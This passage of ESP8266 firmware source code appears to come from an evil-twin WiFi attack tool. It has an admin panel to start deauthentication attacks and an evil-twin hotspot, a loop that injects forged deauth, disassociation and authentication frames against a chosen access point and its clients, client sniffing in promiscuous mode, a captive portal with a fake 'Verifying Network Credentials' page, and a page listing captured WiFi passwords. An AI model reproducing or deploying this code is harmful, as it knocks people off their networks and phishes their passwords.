                                       "  .spinner { margin: 20px auto; }"
                                       "  .spinner > div { width: 14px; height: 14px; }"
                                       "}"
                                       "</style>"
                                       "<script>"
                                       "let progress = 10;"
                                       "const statusMessages = ['Connecting to network...', 'Verifying credentials...', 'Checking firmware 
                                       version...', 'Validating network integrity...', 'Almost done...'];"
                                       "let currentMessage = 0;"
                                       "const interval = setInterval(() => {"
                                       "  progress += 6;"
                                       "  if (progress >= 100) {"
                                       "    clearInterval(interval);"
                                       "    window.location.href = '/result';"
                                       "  }"
                                       "  document.getElementById('progressBar').value = progress;"
                                       "  document.getElementById('progressText').innerText = progress + '%';"
                                       "  if (progress % 20 === 0 && currentMessage < statusMessages.length) {"
                                       "    document.getElementById('statusMessage').innerText = statusMessages[currentMessage];"
                                       "    currentMessage++;"
                                       "  }"
                                       "}, 1000);"
                                       "setTimeout(() => window.location.href = '/result', 15000);"
                                       "</script>"
                                       "</head><body>"
                                       "<div class='loader-container'>"
                                       "<h2>Verifying Network Credentials</h2>"
                                       "<div class='spinner'>"
                                       "  <div class='bounce1'></div>"
                                       "  <div class='bounce2'></div>"
                                       "  <div class='bounce3'></div>"
                                       "</div>"
                                       "<progress id='progressBar' value='10' max='100'></progress>"
                                       "<p id='progressText'>10%</p>"
                                       "<p id='statusMessage' class='status-text'>Connecting to network...</p>"
                                       "</div></body></html>");
    } else {

      if (isApple) {

        webServer.sendHeader("X-Apple-MobileWeb-App-Capable", "yes");
        webServer.sendHeader("X-Apple-Touch-Fullscreen", "yes");
      }
      
      webServer.send(200, CONTENT_TYPE_HTML, index());
    }
  }
}

void handleAdmin()
{
  String _html = _tempHTML;

  if (webServer.hasArg("ap"))
  {
    for (int i = 0; i < 16; i++)
    {
      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap"))
      {
        _selectedNetwork = _networks[i];
      }
    }
  }

  if (webServer.hasArg("deauth"))
  {
    if (webServer.arg("deauth") == "start")
    {
      deauthing_active = true;
    }
    else if (webServer.arg("deauth") == "stop")
    {
      deauthing_active = false;
    }
  }

  if (webServer.hasArg("intensity"))
  {
    int intensity = webServer.arg("intensity").toInt();
    if (intensity >= 1 && intensity <= 5)
    {

      deauth_interval = 600 - (intensity * 100);
      Serial.print("Deauth interval set to: ");
      Serial.println(deauth_interval);
    }
  }

  if (webServer.hasArg("scan"))
  {
    if (webServer.arg("scan") == "start")
    {
      scan_for_clients = true;

      last_client_scan = 0;
    }
    else if (webServer.arg("scan") == "stop")
    {
      scan_for_clients = false;
     
      client_count = 0;
    }
  }

  if (webServer.hasArg("hotspot"))
  {
    if (webServer.arg("hotspot") == "start")
    {
      hotspot_active = true;

      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP(_selectedNetwork.ssid.c_str());
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    else if (webServer.arg("hotspot") == "stop")
    {
      hotspot_active = false;
      dnsServer.stop();
      int n = WiFi.softAPdisconnect(true);
      Serial.println(String(n));
      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
      WiFi.softAP("WiFi_Setup", "@wifi2005309@");
      dnsServer.start(53, "*", IPAddress(192, 168, 4, 1));
    }
    return;
  }

  for (int i = 0; i < 16; ++i)
  {
    if (_networks[i].ssid == "")
    {
      break;
    }
    _html += "<tr><td>" + _networks[i].ssid + "</td><td>" + bytesToStr(_networks[i].bssid, 6) + "</td><td>" + String(_networks[i].ch) + "</td><td>" +
             getSignalStrength(_networks[i].rssi) + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>";

    if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6))
    {
      _html += "<button class='select-btn'>Selected</button></form></td></tr>";
    }
    else
    {
      _html += "<button class='normal-btn'>Select</button></form></td></tr>";
    }
  }

  if (deauthing_active)
  {
    _html.replace("{deauth_button}", "Stop Deauth Attack");
    _html.replace("{deauth}", "stop");
  }
  else
  {
    _html.replace("{deauth_button}", "Start Deauth Attack");
    _html.replace("{deauth}", "start");
  }

  if (hotspot_active)
  {
    _html.replace("{hotspot_button}", "Stop Evil Twin");
    _html.replace("{hotspot}", "stop");
  }
  else
  {
    _html.replace("{hotspot_button}", "Start Evil Twin");
    _html.replace("{hotspot}", "start");
  }

  if (scan_for_clients)
  {
    _html.replace("{scan_button}", "Stop Client Scan");
    _html.replace("{scan}", "stop");
  }
  else
  {
    _html.replace("{scan_button}", "Start Client Scan");
    _html.replace("{scan}", "start");
  }

  if (_selectedNetwork.ssid == "")
  {
    _html.replace("{disabled}", " disabled");
  }
  else
  {
    _html.replace("{disabled}", "");
  }

  _html += "</table></div>";

  if (_correct != "")
  {
    _html += "<div class='success-message'>" + _correct + "</div>";
  }


  if (_selectedNetwork.ssid != "")
  {
    _html += "<div class='settings-panel'>";
    _html += "<h3>Attack Settings</h3>";
    _html += "<form method='post' action='/admin'>";
    _html += "<div class='settings-row'>";
    _html += "<label for='intensity'>Deauth Intensity:</label>";
    _html += "<select id='intensity' name='intensity'>";

    for (int i = 1; i <= 5; i++)
    {
      int interval = 600 - (i * 100);
      bool selected = (interval == deauth_interval);
      _html += "<option value='" + String(i) + "'" + (selected ? " selected" : "") + ">" +
               String(i) + " - " + (i == 1 ? "Low" : (i == 3 ? "Medium" : (i == 5 ? "High" : ""))) +
               " (" + String(1000 / interval) + " packets/sec)</option>";
    }

    _html += "</select>";
    _html += "</div>";
    _html += "<button class='apply-btn'>Apply Settings</button>";
    _html += "</form>";
    _html += "</div>";
  }


  if (client_count > 0 && scan_for_clients)
  {
    _html += "<div class='client-list'>";
    _html += "<h3>Connected Clients (" + String(client_count) + ")</h3>";
    for (int i = 0; i < client_count; i++)
    {
      _html += "<div class='client-item'>" + bytesToStr(client_addresses[i], 6) + "</div>";
    }
    _html += "</div>";
  }

  _html += "<form method='get' action='/admin'><button class='refresh-btn'>Refresh Networks</button></form>";

  _html += "<form method='get' action='/stored' style='margin-top:10px;'><button class='refresh-btn' style='background-color:#007aff;'>View Stored Credentials</button></form>";

  _html += "</div></body></html>";
  webServer.send(200, "text/html", _html);
}

String bytesToStr(const uint8_t *b, uint32_t size)
{
  String str;
  const char ZERO = '0';
  const char DOUBLEPOINT = ':';
  for (uint32_t i = 0; i < size; i++)
  {
    if (b[i] < 0x10)
      str += ZERO;
    str += String(b[i], HEX);

    if (i < size - 1)
      str += DOUBLEPOINT;
  }
  return str;
}

String getSignalStrength(int32_t rssi) {
  String bars;
  String color;
  

  if (rssi >= -50) {
    color = "#34c759"; // Strong - Green
    bars = "#####";
  } else if (rssi >= -60) {
    color = "#34c759"; // Good - Green
    bars = "####-";
  } else if (rssi >= -70) {
    color = "#34c759"; // Good - Green
    bars = "###--";
  } else if (rssi >= -80) {
    color = "#ff9500"; // Fair - Orange
    bars = "##---";
  } else if (rssi >= -90) {
    color = "#ff3b30"; // Poor - Red
    bars = "#----";
  } else {
    color = "#ff3b30"; // Very Poor - Red
    bars = "-----";
  }


  String quality;
  if (rssi >= -50) quality = "Excellent";
  else if (rssi >= -60) quality = "Very Good";
  else if (rssi >= -70) quality = "Good";
  else if (rssi >= -80) quality = "Fair";
  else if (rssi >= -90) quality = "Poor";
  else quality = "Very Poor";

  String html = "<div style='display:inline-flex;align-items:center;gap:10px;background-color:rgba(0,0,0,0.03);padding:4px 8px;border-radius:4px;'>";
  html += "<span style='font-family:monospace;color:" + color + ";font-size:1.1em;letter-spacing:2px;font-weight:bold;'>" + bars + "</span>";
  html += "<span style='color:" + color + ";font-weight:500;'>" + quality + "</span>";
  html += "<span style='color:#666;font-size:0.85em;'>" + String(rssi) + " dBm</span>";
  html += "</div>";
  
  return html;
}

unsigned long now = 0;
unsigned long wifinow = 0;
unsigned long deauth_now = 0;

uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
uint8_t wifi_channel = 1;


#define DNS_CACHE_SIZE 64
struct DNSCacheEntry {
  String domain;
  unsigned long timestamp;
};
DNSCacheEntry dnsCache[DNS_CACHE_SIZE];
int dnsCacheIndex = 0;
const unsigned long DNS_CACHE_TTL = 300000; 

void cleanDNSCache() {
  unsigned long currentTime = millis();
  for (int i = 0; i < DNS_CACHE_SIZE; i++) {
    if (dnsCache[i].domain.length() > 0 && 
        currentTime - dnsCache[i].timestamp > DNS_CACHE_TTL) {
      dnsCache[i].domain = "";
    }
  }
}


bool isInDNSCache(String domain) {
  for (int i = 0; i < DNS_CACHE_SIZE; i++) {
    if (dnsCache[i].domain == domain) {
      if (millis() - dnsCache[i].timestamp <= DNS_CACHE_TTL) {
        return true;
      } else {
        dnsCache[i].domain = ""; 
        return false;
      }
    }
  }
  return false;
}


void addToDNSCache(String domain) {
  if (!isInDNSCache(domain)) {
    dnsCache[dnsCacheIndex].domain = domain;
    dnsCache[dnsCacheIndex].timestamp = millis();
    dnsCacheIndex = (dnsCacheIndex + 1) % DNS_CACHE_SIZE;
  }
}


bool isCaptivePortalRequest() {
  String host = webServer.hostHeader();
  
  
  if (host == webServer.client().localIP().toString()) {
    return false;
  }
  
  if (isCaptivePortalDetection()) {
    return true;
  }
  

  String uri = webServer.uri();
  if (uri.indexOf("generate_204") >= 0 ||
      uri.indexOf("redirect") >= 0 ||
      uri.indexOf("success.txt") >= 0 ||
      uri.indexOf("hotspot-detect") >= 0 ||
      uri.indexOf("ncsi.txt") >= 0) {
    return true;
  }
  
  if (isInDNSCache(host)) {
    return false;
  }

  addToDNSCache(host);
  return true;
}

void loop() {
 
  static unsigned long lastCacheClean = 0;
  if (millis() - lastCacheClean > 60000) { 
    cleanDNSCache();
    lastCacheClean = millis();
  }

  
  dnsServer.processNextRequest();
  webServer.handleClient();


  if (webServer.client().localPort() == 443) {
    handleHTTPS();
    return;
  }

  if (deauthing_active && millis() - deauth_now >= deauth_interval) {
   

    wifi_set_channel(_selectedNetwork.ch);


    uint8_t reason_code = reason_codes[random(0, num_reason_codes)];


    uint8_t deauthPacket[26] = {
        0xC0, 0x00,                         
        0x00, 0x00,                        
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,   
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00,                        
        reason_code, 0x00                   
    }; 

    uint8_t disassocPacket[26] = {
        0xA0, 0x00,                        
        0x00, 0x00,                        
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
        0x00, 0x00,                         
        reason_code, 0x00                 
    }; 


    uint8_t authPacket[30] = {
        0xB0, 0x00,                           
        0x00, 0x00,                         
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00,                         
        0x03, 0x00,                       
        0x01, 0x00,                        
        0x0F, 0x00                          
    }; 


    if (scan_for_clients && millis() - last_client_scan > 10000)
    {
      scanForClients();
      last_client_scan = millis();
    }

    
    memcpy(&deauthPacket[4], broadcast, 6);
    memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
    wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);


    memcpy(&disassocPacket[4], broadcast, 6);
    memcpy(&disassocPacket[10], _selectedNetwork.bssid, 6);
    memcpy(&disassocPacket[16], _selectedNetwork.bssid, 6);
    wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);


    for (int i = 0; i < client_count && i < MAX_CLIENTS; i++)
    {

      memcpy(&deauthPacket[4], client_addresses[i], 6);
      memcpy(&deauthPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&deauthPacket[16], _selectedNetwork.bssid, 6);
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

 
      memcpy(&deauthPacket[4], _selectedNetwork.bssid, 6);
      memcpy(&deauthPacket[10], client_addresses[i], 6);
      memcpy(&deauthPacket[16], client_addresses[i], 6);
      wifi_send_pkt_freedom(deauthPacket, sizeof(deauthPacket), 0);

  
      memcpy(&disassocPacket[4], client_addresses[i], 6);
      memcpy(&disassocPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&disassocPacket[16], _selectedNetwork.bssid, 6);
      wifi_send_pkt_freedom(disassocPacket, sizeof(disassocPacket), 0);


      memcpy(&authPacket[4], client_addresses[i], 6);
      memcpy(&authPacket[10], _selectedNetwork.bssid, 6);
      memcpy(&authPacket[16], _selectedNetwork.bssid, 6);
      wifi_send_pkt_freedom(authPacket, sizeof(authPacket), 0);


      delay(1);
    }

    deauth_now = millis();
  }

  if (millis() - now >= 15000)
  {
    performScan();
    now = millis();
  }

  if (millis() - wifinow >= 2000)
  {
    if (WiFi.status() != WL_CONNECTED)
    {
      Serial.println("BAD");
    }
    else
    {
      Serial.println("GOOD");
    }
    wifinow = millis();
  }
}


void scanForClients() {
  if (_selectedNetwork.ssid == "") return;

  Serial.println("Scanning for clients on " + _selectedNetwork.ssid);
  Serial.println("Channel: " + String(_selectedNetwork.ch));


  uint8_t previous_clients[MAX_CLIENTS][6];
  int previous_count = client_count;
  
  for (int i = 0; i < client_count; i++) {
    memcpy(previous_clients[i], client_addresses[i], 6);
  }

  client_count = 0;


  wifi_set_channel(_selectedNetwork.ch);
  wifi_promiscuous_enable(0);
  wifi_set_promiscuous_rx_cb([](uint8_t *buf, uint16_t len) {
    if (len < 24) return;
    
  
    uint8_t frame_type = buf[12] & 0x0C;
    uint8_t frame_subtype = buf[12] & 0xF0;

    if (frame_subtype == 0x80) return; 
    
    uint8_t *addr1 = &buf[16]; 
    uint8_t *addr2 = &buf[10]; 
    uint8_t *addr3 = &buf[4];  
    

    Serial.print("Frame type: 0x");
    Serial.print(frame_type, HEX);
    Serial.print(" subtype: 0x");
    Serial.println(frame_subtype, HEX);
    
 
    bool is_ap_related = false;
    if (memcmp(addr1, _selectedNetwork.bssid, 6) == 0 ||
        memcmp(addr2, _selectedNetwork.bssid, 6) == 0 ||
        memcmp(addr3, _selectedNetwork.bssid, 6) == 0) {
      is_ap_related = true;
    }
    
    if (!is_ap_related) return;
    
 
    uint8_t *client_addr = NULL;
    if (memcmp(addr1, _selectedNetwork.bssid, 6) != 0 && !isMulticast(addr1)) {
      client_addr = addr1;
    } else if (memcmp(addr2, _selectedNetwork.bssid, 6) != 0 && !isMulticast(addr2)) {
      client_addr = addr2;
    } else if (memcmp(addr3, _selectedNetwork.bssid, 6) != 0 && !isMulticast(addr3)) {
      client_addr = addr3;
    }
    
    if (client_addr == NULL) return;
    

    for (int i = 0; i < client_count; i++) {
      if (memcmp(client_addresses[i], client_addr, 6) == 0) return;
    }
    

    if (client_count < MAX_CLIENTS) {
      memcpy(client_addresses[client_count], client_addr, 6);
      client_count++;
      Serial.print("New client found: ");
      Serial.println(bytesToStr(client_addr, 6));
    }
  });


  wifi_promiscuous_enable(1);
  delay(5000);
  wifi_promiscuous_enable(0);
  

  wifi_set_promiscuous_rx_cb(NULL);
  
  if (client_count == 0 && previous_count > 0) {
    for (int i = 0; i < previous_count; i++) {
      memcpy(client_addresses[i], previous_clients[i], 6);
    }
    client_count = previous_count;
    Serial.println("Restored previous client list");
  }

  Serial.print("Total clients found: ");
  Serial.println(client_count);
}


bool isMulticast(uint8_t *addr) {
  return (addr[0] & 0x01) || 
         (addr[0] == 0xFF && addr[1] == 0xFF && addr[2] == 0xFF && 
          addr[3] == 0xFF && addr[4] == 0xFF && addr[5] == 0xFF); 
}


void handleStoredCredentials()
{
  String html = "<!DOCTYPE html><html><head>"
                "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                "<style>"
                "* { box-sizing: border-box; }"
                "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 10px; }"
                ".content { max-width: 100%; margin: auto; background: white; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); padding: 15px; }"
                ".header { display: flex; flex-direction: column; margin-bottom: 15px; }"
                ".title { font-size: 1.5rem; font-weight: 500; color: #333; margin-bottom: 15px; }"
                ".table-container { overflow-x: auto; }"
                "table { width: 100%; border-collapse: collapse; margin: 15px 0; box-shadow: 0 1px 3px rgba(0,0,0,0.1); }"
                "th { background-color: #f2f2f2; color: #333; font-weight: 600; text-align: left; }"
                "th, td { padding: 10px; border-bottom: 1px solid #ddd; }"
                "tr:hover { background-color: #f5f5f5; }"
                ".delete-btn { background-color: #ff3b30; color: white; padding: 6px 12px; border: none; border-radius: 4px; cursor: pointer; }"
                ".delete-btn:hover { background-color: #d63125; }"
                ".back-btn { background-color: #5856d6; color: white; margin-top: 15px; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; transition: all 0.3s; }"
                ".back-btn:hover { background-color: #4745b3; }"
                ".delete-all-btn { background-color: #ff3b30; color: white; margin-top: 15px; padding: 10px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: 500; transition: all 0.3s; }"
                ".delete-all-btn:hover { background-color: #d63125; }"
                ".no-creds { color: #666; text-align: center; padding: 20px; }"
                "@media (min-width: 768px) {"
                "  body { padding: 20px; }"
                "  .content { max-width: 800px; padding: 20px; }"
                "}"
                "</style>"
                "</head><body><div class='content'>"
                "<div class='header'>"
                "<div class='title'>Stored Credentials</div>"
                "</div>";

  if (credentialsCount > 0)
  {
    html += "<div class='table-container'>"
            "<table><tr><th>SSID</th><th>Password</th><th>Action</th></tr>";

    for (int i = 0; i < credentialsCount; i++)
    {
      html += "<tr><td>" + String(storedCredentials[i].ssid) + "</td><td>" +
              String(storedCredentials[i].password) + "</td><td>" +
              "<form method='get' action='/delete'>" +
              "<input type='hidden' name='id' value='" + String(i) + "'>" +
              "<button class='delete-btn'>Delete</button></form></td></tr>";
    }

    html += "</table></div>";

 
    html += "<form method='get' action='/deleteall' style='margin-top:10px;'>";
    html += "<button class='delete-all-btn'>Delete All Credentials</button></form>";
  }
  else
  {
    html += "<div class='no-creds'>No stored credentials found.</div>";
  }

  html += "<form method='get' action='/admin'><button class='back-btn'>Back to Admin</button></form>";
  html += "</div></body></html>";

  webServer.send(200, "text/html", html);
}


void handleDeleteCredential()
{
  if (webServer.hasArg("id"))
  {
    int id = webServer.arg("id").toInt();
    if (id >= 0 && id < credentialsCount)
    {
     
      deleteCredential(id);

      webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                       "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                                       "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                                       "<style>"
                                       "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                                       ".success-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
                                       ".success-icon { color: #34c759; font-size: 50px; margin-bottom: 20px; }"
                                       "h2 { color: #333; margin-top: 0; font-size: 1.5rem; }"
                                       "p { color: #666; }"
                                       "</style>"
                                       "<script>setTimeout(function(){window.location.href = '/stored';}, 2000);</script>"
                                       "</head><body>"
                                       "<div class='success-container'>"
                                       "<div class='success-icon'>&#10004;</div>"
                                       "<h2>Credential Deleted</h2>"
                                       "<p>The credential has been successfully deleted.</p>"
                                       "</div></body></html>");
    }
    else
    {
      webServer.send(400, "text/plain", "Invalid credential ID");
    }
  }
  else
  {
    webServer.send(400, "text/plain", "Missing credential ID");
  }
}


void handleDeleteAllCredentials()
{
  deleteAllCredentials();

  webServer.send(200, "text/html", "<!DOCTYPE html><html><head>"
                                   "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
                                   "<link rel=\"icon\" href=\"data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath fill='%230066ff' d='M12,21L15.6,16.2C14.6,15.45 13.35,15 12,15C10.65,15 9.4,15.45 8.4,16.2L12,21M12,3C7.95,3 4.21,4.34 1.2,6.6L3,9C5.5,7.12 8.62,6 12,6C15.38,6 18.5,7.12 21,9L22.8,6.6C19.79,4.34 16.05,3 12,3M12,9C9.3,9 6.81,9.89 4.8,11.4L6.6,13.8C8.1,12.67 9.97,12 12,12C14.03,12 15.9,12.67 17.4,13.8L19.2,11.4C17.19,9.89 14.7,9 12,9Z'/%3E%3C/svg%3E\" type=\"image/svg+xml\">"
                                   "<style>"
                                   "body { font-family: 'Segoe UI', Tahoma, Arial, sans-serif; background-color: #f5f5f5; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }"
                                   ".success-container { background: white; border-radius: 8px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); padding: 20px; text-align: center; width: 90%; max-width: 400px; }"
                                   ".success-icon { color: #34c759; font-size: 50px; margin-bottom: 20px; }"
                                   "h2 { color: #333; margin-top: 0; font-size: 1.5rem; }"
                                   "p { color: #666; }"
                                   "</style>"
                                   "<script>setTimeout(function(){window.location.href = '/stored';}, 2000);</script>"
                                   "</head><body>"
                                   "<div class='success-container'>"
                                   "<div class='success-icon'>&#10004;</div>"
                                   "<h2>All Credentials Deleted</h2>"
                                   "<p>All stored credentials have been successfully deleted.</p>"
                                   "</div></body></html>");
}


void handleCaptivePortal() {
  if (isCaptivePortalRequest()) {
    if (hotspot_active) {

      webServer.sendHeader("Cache-Control", CACHE_CONTROL_NO_CACHE);
      webServer.send(204);
    } else {
    
      webServer.sendHeader("Location", "http://" + webServer.client().localIP().toString(), true);
      webServer.send(302, CONTENT_TYPE_PLAIN, "");
    }
    return;
  }
  
 
  handleIndex();
}
